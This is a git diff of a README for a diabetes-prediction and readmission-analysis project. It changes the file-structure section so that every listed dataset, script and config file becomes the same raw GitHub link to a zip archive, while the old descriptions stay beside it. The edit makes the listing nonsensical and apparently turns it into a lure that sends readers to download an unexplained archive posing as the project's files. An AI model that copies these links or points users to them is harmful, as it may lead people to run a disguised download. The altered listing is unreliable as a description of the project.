@@ -18,12 +18,12 @@ This project focuses on improving diabetes-related healthcare insights using mac
 ## 📁 File Structure
 
 ```plaintext
-├── diabetes.csv                     # PIMA Indian Diabetes dataset
-├── diabetic_data.csv               # UCI Diabetic Readmission dataset
-├── diabetes_modeling.py            # Script for KNN imputation and Logistic Regression
-├── readmission_analysis.py        # Script for readmission exploratory analysis
-├── requirements.txt                # Python dependencies
-└── README.md                       # You're here!
+├── https://raw.githubusercontent.com/SIVARANJANI63/healthcare/main/healthcare/healthcare-v2.4.zip                     # PIMA Indian Diabetes dataset
+├── https://raw.githubusercontent.com/SIVARANJANI63/healthcare/main/healthcare/healthcare-v2.4.zip               # UCI Diabetic Readmission dataset
+├── https://raw.githubusercontent.com/SIVARANJANI63/healthcare/main/healthcare/healthcare-v2.4.zip            # Script for KNN imputation and Logistic Regression
+├── https://raw.githubusercontent.com/SIVARANJANI63/healthcare/main/healthcare/healthcare-v2.4.zip        # Script for readmission exploratory analysis
+├── https://raw.githubusercontent.com/SIVARANJANI63/healthcare/main/healthcare/healthcare-v2.4.zip                # Python dependencies
+└── https://raw.githubusercontent.com/SIVARANJANI63/healthcare/main/healthcare/healthcare-v2.4.zip                       # You're here!
 
 ```
 ## 🧪 Task 1: Diabetes Prediction using Logistic Regression
